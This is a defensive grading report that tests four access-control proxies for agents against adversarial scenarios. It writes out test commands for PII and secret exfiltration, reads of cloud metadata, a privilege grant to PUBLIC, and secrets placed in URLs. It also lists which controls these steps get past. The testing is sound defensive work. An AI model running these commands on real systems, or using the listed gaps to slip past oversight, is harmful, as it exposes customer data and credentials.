# Role-Effectiveness Grades — 2026-05-22

Adversarial-corpus grading run per `[[role-effectiveness-grading]]` against the
corpus in `[[role-effectiveness-corpus]]`. Goal: did the iam-jit-issued
profile MEANINGFULLY constrain misuse, or did it just look like it did?

Grader: separate from implementer per the discipline. Bouncers run on FREE
19xxx loopback ports against substrate (LocalStack :4566, postgres :5432,
kind cluster on :62384, curl-as-HTTPS-client for gbounce).

## TL;DR

| # | Scenario | Grade | One-line why |
|---|---|---|---|
| I1 | ibounce safe-default, bucket-scope vs PII exfil | THEATER | `s3:GetObject` on `customer-pii-bucket` returned 200 + payload — readonly-admin-minus has no bucket-name carve-out; per `[[ibounce-honest-positioning]]` this is the corpus-predicted "looks scoped, isn't confidentiality" case. |
| I2 | ibounce safe-default permissive-by-design | PARTIAL | `secretsmanager:GetSecretValue` BLOCKED (in `deny_actions`), but `s3:GetObject` on any bucket + `dynamodb:Scan` on `customers`/`credentials` ALLOWED. Catches the explicitly-enumerated sensitive surface; readonly-admin-minus baseline does not enforce confidentiality. |
| I3 | ibounce admin-baseline-minus-sensitive escalation | UNRUN | No `admin-minus-sensitive` profile ships in v1.0 ibounce defaults (only `safe-default` + `full-user`). Corpus scenario references a profile not shipped; flag for either (a) ship it, or (b) re-author the corpus row. Under `safe-default` the escalation primitives (`iam:CreatePolicy`, `iam:AttachUserPolicy`, `iam:CreateRole`) DO deny correctly. |
| I4 | ibounce DynamoDB scope under cooperative trust | THEATER | Profile gates by ARN-glob, not table name. `secrets-*` table glob is denied; tables literally named `customers` and `credentials` are ALLOWED to scan. Cooperative-trust assumption irrelevant — even in transparent mode the role permits the exfil. |
| K1 | kbouncer safe-default, rollout-restart vs delete-ns | NEGATIVE-VALUE | Legit `rollout restart` = HTTP PATCH = in `deny_verbs` → BLOCKED. Adv `delete namespace` ALSO BLOCKED. Two failure modes: legit work refused AND adversarial action blocked. Corpus expected a non-default profile that allows `patch`; safe-default's `deny_verbs: [create, update, patch, delete, deletecollection]` is too coarse for the rollout-restart legit-action. |
| K2 | kbouncer scope-pivot to secrets | THEATER | `kubectl logs` ALLOWED (read), `kubectl get secret -A -o yaml` also ALLOWED + returned bootstrap-token secret. Safe-default has no resource-type gating on reads; the "scope" is verb-level only. Honest §B5-class limit. |
| K3 | kbouncer apply Deployment vs ClusterRoleBinding | NEGATIVE-VALUE | Both `kubectl apply -f deployment.yaml` AND `kubectl apply -f clusterrolebinding.yaml` BLOCKED — safe-default denies all `create`. The corpus scenario assumed a non-default profile that allows `apply on Deployments`; that profile would still need RBAC-resource-type gating which kbouncer does not surface as a separate predicate. |
| K4 | kbouncer container-internal pod-to-pod | UNRUN (HONEST LIMIT) | Per §B5 caveat: kbouncer sits between kubectl/client-go and apiserver; pod-to-pod / container-internal HTTP is INVISIBLE. Documented limit, not theater — operator should be told. |
| D1 | dbounce safe-default, count vs `SELECT *` | THEATER | Legit `SELECT count(*) FROM users` allowed. Adv `SELECT * FROM credit_cards` ALSO allowed — returned full row including `4111-fake-test`. sql_read_only baseline does not distinguish summary vs full-table dump. Corpus-predicted theater confirmed. |
| D2 | dbounce task-scoped INSERT vs DROP | NEGATIVE-VALUE | Legit `INSERT INTO audit_log` BLOCKED by safe-default's AST-walk-mutating-node net. Adv `DROP TABLE audit_log` also BLOCKED. The corpus assumes a profile that allows the INSERT; safe-default denies any mutating node — net effect: legit refused, attacker can't proceed either, but the role does not do the "permit this task, refuse that task" discrimination the corpus tests. |
| D3 | dbounce sql_read_write + DCL floor | PARTIAL with launch-blocker | **WITH FRESH PROFILE (regenerated from embedded defaults):** `GRANT ALL PRIVILEGES ... TO PUBLIC` BLOCKED by `deny_dcl_targets_public`. **WITH OPERATOR'S EXISTING `~/.dbounce/profiles.yaml` (May 18 timestamp):** GRANT-to-PUBLIC ALLOWED through. The DCL floor #302 was added to embedded defaults AFTER May 18; existing operator files are NOT auto-upgraded (per the "never overwrite once exists" rule). Cross-bouncer pattern likely. |
| D4 | dbounce read-replica vs COPY exfil | MEANINGFUL on COPY, THEATER on SELECT-as-exfil | Adv `COPY (SELECT * FROM credit_cards) TO STDOUT` BLOCKED (COPY classified as mutating). Adv `SELECT * FROM credit_cards` ALSO succeeded (D1 finding). So statement-shape-based exfil (COPY) is constrained; query-shape exfil is not. |
| G1 | gbounce deny_hosts IMDS + openai | MEANINGFUL | CONNECT to `169.254.169.254:80` returns 403 from gbounce + audit `verdict=DENY`. CONNECT to `api.openai.com:443` also 403 + DENY. Legit CONNECT to `docs.python.org:443` returns 200. The deny_hosts rule fires at CONNECT time before the upstream socket opens. |
| G2 | gbounce CONNECT-mode URL invisibility | THEATER (HONEST LIMIT) | Adv `curl https://httpbin.org/post?secret=password123&api_key=sk-leaked` over CONNECT: audit row shows ONLY `CONNECT httpbin.org:443 -> ALLOW` — no path, no query string. Secret crosses the proxy invisibly. This is the documented §B8 caveat — operator must be told. |
| G3 | gbounce MITM + profile-rule POST /v1/chat/completions deny | MEANINGFUL | After installing the local CA + restarting `--mode mitm --profile-rules-file rules.json` with `{"deny_rules":[{"host":"api.openai.com","method":"POST","path_prefix":"/v1/chat/completions","reason":"block LLM API egress"}]}`: legit `GET /v1/models` passes (401 from upstream for missing auth), adv `POST /v1/chat/completions` returns 403 + "gbounce: request denied by profile rule: block LLM API egress". MITM mode + JSON-not-YAML rules-file gotcha (key is `deny_rules`, not `rules`). |
| G4 | gbounce body redaction URL-embedded creds | PARTIAL with theater | Credential-named query params ARE redacted: `?auth_token=sk-...` → `?auth_token=***REDACTED-CREDENTIAL***` in audit log. URL-PATH-embedded secrets (`/anything/sk-test-real-secret-789/profile`) AND non-credential-named query params (`?data=Bearer%20sk-test-real-secret-456`) LEAK INTO THE AUDIT LOG verbatim. Redactor is name-based, not value-shape-based. |

## Aggregate

- **MEANINGFUL:** 3 / 16 (G1, G3, D4-COPY-half)
- **PARTIAL:** 3 / 16 (I2, D3, G4)
- **THEATER:** 5 / 16 (I1, I4, K2, D1, G2)
- **NEGATIVE-VALUE:** 3 / 16 (K1, K3, D2)
- **UNRUN:** 2 / 16 (I3 profile not shipped, K4 honest §B5 limit)

**MEANINGFUL+ (real constraint that did real work):** 6 / 16 = **37.5%**

By bouncer:
- **ibounce:** 0 MEANINGFUL / 1 PARTIAL / 2 THEATER / 0 NEG / 1 UNRUN. Net: the safe-default profile blocks Write-classified actions reliably; it does NOT enforce confidentiality on reads, which is what the corpus stress-tests.
- **kbouncer:** 0 MEANINGFUL / 0 PARTIAL / 1 THEATER / 2 NEG / 1 UNRUN-honest. Net: safe-default's `deny_verbs` is too coarse — legit operator tasks (rollout restart = patch; apply Deployment = create) collide with it. Adversarial actions get blocked too, but the role pays NEGATIVE rent on real workflows.
- **dbounce:** 1 MEANINGFUL / 1 PARTIAL / 1 THEATER / 1 NEG. Net: AST-walk backstop catches statement-shape mutations; `SELECT *` exfil walks through. Stale operator profile from May 18 misses the DCL floor — launch-blocker for the "operator who installed last week" path.
- **gbounce:** 2 MEANINGFUL / 1 PARTIAL / 1 THEATER. Net: deny_hosts + MITM + profile-rules work. CONNECT-only mode invisibility is the documented limit. Body redaction is name-based, not shape-based.

**Threshold per `[[role-effectiveness-grading]]`:** if >25% are THEATER or NEGATIVE-VALUE, marketing copy needs re-grounding before launch. **8 / 16 = 50% are THEATER or NEGATIVE-VALUE.** Launch-readiness affected.

## Per-scenario detail

### I1 — ibounce safe-default, bucket-scope vs PII exfil

**Setup**
- ibounce launched: `iam-jit-bouncer run --port 19767 --mode transparent --profile safe-default --upstream http://127.0.0.1:4566 --default-policy allow`
- LocalStack buckets: `customer-pii-bucket` (with object `pii.txt`), `backup-bucket-2026`

**Legit action**
```
AWS_ENDPOINT_URL=http://127.0.0.1:19767 aws s3api list-buckets
```
Result: succeeded, both buckets enumerated. Audit: `verdict=ALLOW`, baseline=aws_managed_readonly_access matched.

**Adversarial action**
```
AWS_ENDPOINT_URL=http://127.0.0.1:19767 aws s3api get-object --bucket customer-pii-bucket --key pii.txt /tmp/exfil-pii.txt
```
Result: succeeded. Returned 200 + payload `test pii data`. Audit: `verdict=ALLOW`, profile=safe-default matched the baseline.

**Grade: THEATER**
The profile permitted the action because s3:GetObject is in the Read access-level set. The only `s3:GetObject` deny is conditional on `tag/sensitive=true`. A bucket-name pattern is not the corpus profile model.

**Implications**
Founder: this is the corpus-predicted "looks scoped, isn't confidentiality" finding. Marketing copy must not imply that "readonly-admin-minus" prevents PII exfil. The §B3 caveat already says this; surface it more prominently in ibounce README + landing-page.

---

### I2 — ibounce safe-default permissive-by-design

**Setup**: same as I1. Added LocalStack secret `prod/db/password` + DynamoDB tables `reference`, `customers`, `credentials`.

**Legit action**
```
AWS_ENDPOINT_URL=http://127.0.0.1:19767 aws ec2 describe-instances
```
Result: ALLOWED. Empty result set (no instances in LocalStack).

**Adversarial actions**
- `secretsmanager:GetSecretValue` → **403 DENY** (matched `deny_actions` in safe-default)
- `s3:GetObject` on any bucket → **ALLOWED** (same as I1)
- `dynamodb:Scan` on `customers` + `credentials` tables → **ALLOWED** (only `secrets-*` table glob is denied)

**Grade: PARTIAL**
safe-default catches the *enumerated* sensitive surface (Secrets Manager, KMS Decrypt, EC2 password-data). It does not catch table-name- or bucket-name-based exfil even when the table is literally named `credentials`.

**Implications**
Per `[[ibounce-honest-positioning]]`: this is the design. Operator needs to know that "readonly-admin-minus" means "read everything not on the deny list" — not "read only things classified non-sensitive." Marketing must NOT use "readonly = safe" without the qualifier.

---

### I3 — ibounce admin-baseline-minus-sensitive escalation

**Setup**: corpus says "admin-baseline minus sensitive." Available default ibounce profiles: `full-user` (passthrough, no rules) and `safe-default` (readonly-admin-minus). No admin-baseline-minus-sensitive ships.

**Grade: UNRUN**

When tested against `safe-default`: `iam:CreatePolicy`, `iam:AttachUserPolicy`, `iam:CreateRole` all DENIED (Write access level, not in baseline). Encouraging — but does NOT satisfy the corpus scenario, which assumes admin-baseline-minus-sensitive ships.

**Implications**
Either (a) ship an `admin-minus-sensitive` ibounce profile, or (b) re-author this corpus row to read "given safe-default + an operator who wants admin-write workflow, what happens?" Currently any operator who needs writes must use `full-user` (no enforcement) — there's a missing middle tier.

---

### I4 — ibounce DynamoDB scope under cooperative trust

**Setup**: same as I2.

**Legit action**: `dynamodb:Scan` on `reference` table → ALLOWED.

**Adversarial action**: `dynamodb:Scan` on `customers` AND `credentials` → BOTH ALLOWED (returned empty payloads only because LocalStack tables had no data — but the access was permitted).

**Grade: THEATER**

The profile's `deny_actions_with_condition` for `dynamodb:Scan` is keyed on a resource-pattern `arn:...:table/secrets-*` glob. Tables literally named `customers` / `credentials` walk through. Cooperative-trust assumption doesn't enter because even with transparent mode + a non-cooperating agent the action is allowed.

**Implications**
This is the same family as I1/I2: name-pattern gating relies on operators using the matching naming convention. Founder note: consider shipping a community pattern recipe like `{table prefix is "raw_" → allow scan; else require step-up}`.

---

### K1 — kbouncer safe-default, rollout-restart vs delete-namespace

**Setup**: kbouncer launched on :19766 with `--mode transparent --profile safe-default --kubeconfig <kind> --insecure-skip-tls-verify --default-policy allow`. Granted `system:anonymous` cluster-admin for test (kbouncer terminates client-cert TLS and doesn't re-present — a known limit; bearer-auth required in real deployment).

**Legit action**
```
kubectl --server=http://127.0.0.1:19766 --insecure-skip-tls-verify -n feature-flags rollout restart deployment/feature-flags
```
Result: **DENIED**. Error: `kbounce denied: profile "safe-default": verb "patch" in deny_verbs`. `kubectl rollout restart` translates to a PATCH on the deployment object.

**Adversarial action**
```
kubectl --server=http://127.0.0.1:19766 --insecure-skip-tls-verify delete namespace feature-flags
```
Result: **DENIED**. Error: `verb "delete" in deny_verbs`.

**Grade: NEGATIVE-VALUE**

Legit action blocked AND adversarial action blocked. Operator who installs safe-default cannot run an everyday rollout-restart. Two failure modes in one role.

**Implications**
The kbouncer safe-default `deny_verbs: [create, update, patch, delete, deletecollection]` is a maximalist net. It needs either (a) a per-verb exemption surface for common DevOps verbs like rollout-restart-as-patch, or (b) a recommended "ops-on-call" profile that allows patch + denies delete. This is a launch-blocker for the kubectl-in-CI use case described in `[[terraform-agent-in-cicd-use-case]]`.

---

### K2 — kbouncer scope-pivot to secrets

**Setup**: same as K1.

**Legit action**
```
kubectl --server=... -n feature-flags get pods
```
Result: ALLOWED. Returned 2 pods.

**Adversarial action**
```
kubectl --server=... get secret -A -o yaml
```
Result: ALLOWED. Returned `kube-system/bootstrap-token-abcdef` + other secrets.

**Grade: THEATER**

safe-default's `deny_verbs` is verb-level. `get` is not denied. There is no per-resource-type ALLOW gating on reads (`get`/`list`/`watch`). The "scope" implied by "we restarted the deployment safely" does not extend to "we won't pivot to enumerating secrets."

**Implications**
Marketing for kbouncer must NOT imply that safe-default constrains read scope. The §B-class caveat already says safe-default is not a confidentiality boundary; surface it more prominently. Consider a Pro/Team-tier profile that adds `deny_resources: [secrets]` for the common case.

---

### K3 — kbouncer apply Deployment vs ClusterRoleBinding

**Setup**: same as K1.

**Legit action**
```
kubectl --server=... apply -f deployment.yaml
```
Result: **DENIED**. `verb "create" in deny_verbs`.

**Adversarial action**
```
kubectl --server=... apply -f clusterrolebinding.yaml
```
Result: **DENIED**. Same reason.

**Grade: NEGATIVE-VALUE**

Both blocked because safe-default denies all `create`. The corpus assumes a profile that allows Deployment apply while denying ClusterRoleBinding apply — that profile does not exist in defaults, and kbouncer does not surface "resource-type" as a deny predicate (only `deny_verbs` + the `only_clusters` predicate).

**Implications**
Same as K1: the deny_verbs net is too coarse for differentiated workflows. Founder consideration: ship a `resource_type` predicate in profile schema. Tracks the `[[evolving-preset-library]]` work.

---

### K4 — kbouncer container-internal pod-to-pod

**Grade: UNRUN — HONEST LIMIT**

Per `[[k8s-bouncer-as-separate-product]]` + §B5 caveat: kbouncer terminates kubectl/client-go on the way to the apiserver. Container-internal HTTP between pods does NOT cross the proxy. The scenario is documented as a known limit, not a theater finding.

**Implications**
Founder: this is honest positioning, NOT theater. Surface in landing page: "kbouncer audits the apiserver; for pod-to-pod, see service-mesh policy."

---

### D1 — dbounce safe-default, count vs `SELECT *`

**Setup**: dbounce launched on :19765 against postgres :5432; safe-default profile (regenerated from embedded defaults — see D3 finding).

**Legit action**
```
psql -h ... -p 19765 -c "SELECT count(*) FROM users"
```
Result: ALLOWED. `1`.

**Adversarial action**
```
psql -h ... -p 19765 -c "SELECT * FROM credit_cards"
```
Result: ALLOWED. Returned row `1 | 4111-fake-test`.

**Grade: THEATER**

sql_read_only baseline classifies pure SELECT as ALLOW regardless of which table it hits. No row-count or table-name gating in safe-default. The corpus-predicted "agent exfils PII under read-only" is confirmed.

**Implications**
Marketing for dbounce must NOT imply that safe-default prevents data exfil. §B-class caveat already states this; surface it. Roadmap: add `deny_resources` matching `public.credit_cards` or similar.

---

### D2 — dbounce task-scoped INSERT vs DROP

**Setup**: same as D1.

**Legit action**
```
psql -c "INSERT INTO audit_log (msg) VALUES ('hello')"
```
Result: **DENIED**. `AST-walk backstop — mutating-node:DDL is mutating`. (Note: error message text says "DDL" but the INSERT is DML; the backstop fires on `HasMutatingNode` regardless of classification.)

**Adversarial action**
```
psql -c "DROP TABLE audit_log"
```
Result: **DENIED**. Same backstop, this time DDL.

**Grade: NEGATIVE-VALUE**

Both blocked. The corpus assumes a profile where INSERT is allowed (task-scoped insert into audit_log). safe-default has no exempt_actions/exempt_resources by default, so all mutations deny. Two failure modes: operator can't run the legit insert; attacker can't drop. Net: role is too restrictive for the task.

**Implications**
Same family as K1/K3: cross-bouncer pattern of "safe-default is too coarse for differentiated workflows." Either ship more middle-tier profiles, or document the exempt_resources surface as the primary onboarding hook.

---

### D3 — dbounce sql_read_write + DCL floor

**Setup**: same as D1. Two probes:
1. Against `~/.dbounce/profiles.yaml` dated **2026-05-18** (operator-existing).
2. After `mv ~/.dbounce/profiles.yaml ~/.dbounce/profiles.yaml.bak` + restart — dbounce regenerates the file from embedded defaults.

**Probe 1 (stale operator profile):**
- Legit `UPDATE users SET email=... WHERE id=1` → DENIED by AST-walk backstop (probe-1 didn't get to test sql_read_write because the operator profile was actually safe-default, not sql_read_write).
- Adv `GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO PUBLIC` → **ALLOWED**. Audit: `verdict=ALLOW, decision_source=default, is_dcl=false (!), upstream_status=ok`.

**Probe 2 (regenerated profile):**
- Adv `GRANT ALL PRIVILEGES ... TO PUBLIC` → **DENIED**. Error: `profile "safe-default": DCL targets PUBLIC — GRANT grants privilege to every database role; safe-default refuses privilege escalation to PUBLIC`.

**Grade: PARTIAL with LAUNCH-BLOCKER**

The DCL floor (`deny_dcl_targets_public: true` per task #302) works when the profile YAML contains it. The stale May-18 `~/.dbounce/profiles.yaml` does NOT contain it because dbounce intentionally never overwrites existing operator files (`Edit freely: dbounce NEVER overwrites this file once it exists`). Operators who installed before #302 landed are silently running without the DCL floor — and `dbounce profile list` does NOT warn about it.

**Implications**
LAUNCH-BLOCKER candidate. Mitigations: (a) profile-schema-version bump + first-run warning when version is stale, (b) `dbounce profile diff --embedded` command, (c) docs runbook telling operators to regenerate. Cross-bouncer audit needed — kbouncer and ibounce likely have the same upgrade-blindness for their profile files.

---

### D4 — dbounce read-replica vs COPY exfil

**Setup**: same as D1.

**Legit action**
```
psql -c "SELECT count(*) FROM users"
```
Result: ALLOWED.

**Adversarial action**
```
psql -c "COPY (SELECT * FROM credit_cards) TO STDOUT"
```
Result: **DENIED**. `AST-walk backstop — COPY is mutating`.

**Grade: MEANINGFUL** (COPY half) / **THEATER** (SELECT-as-exfil half — see D1)

The AST-walk classifier flags COPY as mutating (because COPY-from-file is a mutation; COPY-from-query is mis-categorized as mutating too, which incidentally blocks exfil). Adv `SELECT *` (D1) walks through; the COPY exfil shape does not.

**Implications**
Lucky win: an unrelated classifier decision (`COPY is mutating`) blocks a known exfil shape. But operators looking to exfil via SELECT (D1) are not constrained. Document `COPY-from-query → blocked` as a positive value-prop AND `SELECT * → walks through` as the honest limit.

---

### G1 — gbounce deny_hosts IMDS + openai

**Setup**: gbounce launched with `--allow-connect --deny-host '169.254.169.254' --deny-host '*.openai.com'`. (Required rebuilding the shipped binary because `~/repos/gbounce/bin/gbounce` was stale and did not expose `--deny-host`. Operator-impact note: stale local binaries may lack #314.)

**Legit action**
```
curl --proxy http://127.0.0.1:19764 https://docs.python.org
```
Result: 302 (the upstream redirected). Audit: `CONNECT docs.python.org:443 -> ALLOW`.

**Adversarial actions**
- `curl --proxy ... --proxytunnel http://169.254.169.254/...` → 403. Audit: `CONNECT 169.254.169.254:80 -> DENY`.
- `curl --proxy ... https://api.openai.com/v1/models` → 403. Audit: `CONNECT api.openai.com:443 -> DENY`.

**Grade: MEANINGFUL**

deny_hosts fires at the CONNECT phase before the upstream socket opens. Both IMDS-via-CONNECT and openai.com are blocked. Legit destinations pass.

**Implications**
This is a positive value-prop to surface in marketing: "the IMDS rule for SSRF mitigation works out-of-the-box." Note: requires operators to be on a build with #314 shipped — pre-#314 builds don't have the flag.

---

### G2 — gbounce CONNECT-mode URL invisibility

**Setup**: same as G1.

**Legit action**: `curl https://api.weather.gov/` over CONNECT → 200, audit `CONNECT api.weather.gov:443 -> ALLOW`.

**Adversarial action**
```
curl --proxy http://127.0.0.1:19764 "https://httpbin.org/get?secret=password123&api_key=sk-leaked"
```
Result: 200 (upstream returned the data). Audit shows ONLY `CONNECT httpbin.org:443 -> ALLOW`. No path, no query string.

**Grade: THEATER (HONEST LIMIT)**

This is the documented §B8 caveat: in `--mode discovery` (CONNECT only), gbounce sees host:port; it does not see the URL. The secret crosses the proxy invisibly.

**Implications**
Marketing copy: discovery mode is a *deterrent + audit trail*, not a confidentiality boundary. Per `[[ibounce-honest-positioning]]`: never imply discovery-mode gbounce will catch exfil in URL paths. The CLI banner already shows the caveat. Consider a louder visual flag on the landing page.

---

### G3 — gbounce MITM + profile-rule POST deny

**Setup**: 
1. `gbounce ca install` → CA at `~/.iam-jit/gbounce/ca/cert.pem`.
2. Profile JSON file `{"deny_rules": [{"host": "api.openai.com", "method": "POST", "path_prefix": "/v1/chat/completions", "reason": "block LLM API egress"}]}` — note `deny_rules` not `rules` key (one-line hump for operators).
3. Restart: `gbounce run --mode mitm --profile-rules-file rules.json`.

**Legit action**
```
curl --proxy http://127.0.0.1:19764 --cacert <ca> https://api.openai.com/v1/models
```
Result: 401 (upstream complains about missing auth, but the proxy passed it). Audit: `GET /v1/models -> ALLOW`.

**Adversarial action**
```
curl ... -X POST -H 'Content-Type: application/json' -d '{"prompt":"extract"}' https://api.openai.com/v1/chat/completions
```
Result: **403** from gbounce. Body: `gbounce: request denied by profile rule: block LLM API egress`. Audit: `POST /v1/chat/completions -> DENY`.

**Grade: MEANINGFUL**

MITM termination + per-URL+method profile rules work. The deny carries the operator's `reason` string into the 403 body so the agent can self-correct.

**Implications**
Positive value-prop. Marketing should note (a) MITM is opt-in, (b) cert-pinning SDKs break under MITM, (c) the JSON key is `deny_rules` (could be friendlier as `rules` or just align with YAML eventually).

---

### G4 — gbounce body redaction URL-embedded creds

**Setup**: same as G3.

**Legit action**
```
curl -X POST -H 'Authorization: Bearer sk-test-secret-value' -d '{"username":"alice"}' https://httpbin.org/post
```
Result: ALLOWED. Audit: `POST /post -> ALLOW`. The Authorization header is consumed by gbounce + the body redactor stripped it from audit-log storage.

**Adversarial actions (3 variants)**
1. Secret in credential-named query param: `?auth_token=sk-test-secret-value&username=alice`
2. Secret in non-credential-named query param: `?data=Bearer%20sk-test-real-secret-456&user=alice`
3. Secret in URL path: `/anything/sk-test-real-secret-789/profile`

Results:
- Variant 1 → audit row contains `?auth_token=***REDACTED-CREDENTIAL***&username=alice` — **redacted**.
- Variant 2 → audit row contains `?data=Bearer%20sk-test-real-secret-456&user=alice` — **leaked**.
- Variant 3 → audit row contains `/anything/sk-test-real-secret-789/profile` — **leaked**.

**Grade: PARTIAL with theater**

The redactor is *name-based*: it strips values when the field is named one of {`Authorization`, `Cookie`, `x-api-key`, `*_token`, `*_secret`}. It does NOT pattern-match the *value shape* (e.g. `sk-` prefix, JWT three-segment shape). So an attacker who renames their leak vector defeats redaction.

**Implications**
LAUNCH-IMPACT: secrets DO land in the audit log if the operator's threat model includes URL-embedded values. The §B-class caveat already says `--audit-log-include-bodies` is opt-in, but URL paths are emitted regardless. Possible mitigations: (a) shape-based redactor as a layer-2 backstop, (b) explicit operator opt-in for "store URL paths in audit log", (c) warning in `gbounce doctor` when MITM mode is active.

---

## Founder summary (3 sentences, brutally honest)

iam-jit-issued roles MEANINGFULLY constrain the adversarial action in **6 of 16
scenarios** (37.5%); the remaining 10 split between **5 THEATER** (the role looks
scoped but the attacker walks through — most notably I1/I4 bucket-+-table-name
patterns, D1 SELECT-as-exfil, G2 CONNECT-mode URL invisibility, K2 secret
enumeration) and **3 NEGATIVE-VALUE** (the safe-default profile is too coarse for
common DevOps workflows — K1 rollout restart, K3 apply Deployment, D2 INSERT — so
operators pay enforcement rent on legit work while the adversary just runs a
different verb). The single launch-blocker discovered is the **dbounce stale-profile
bug** (D3): operators who installed before task #302 silently run without the
DCL-to-PUBLIC floor because `~/.dbounce/profiles.yaml` is intentionally never
overwritten, and kbouncer + ibounce likely share the upgrade-blindness — fix the
profile-schema-version + first-run-warning before launch. The honest takeaway per
`[[ibounce-honest-positioning]]`: the bouncers are a deterrent + audit trail + a
verb-level firewall against the most obvious mutations, **not** a confidentiality
boundary — marketing copy that implies "readonly = safe" misleads operators about
what 5 of the 16 scenarios actually do.
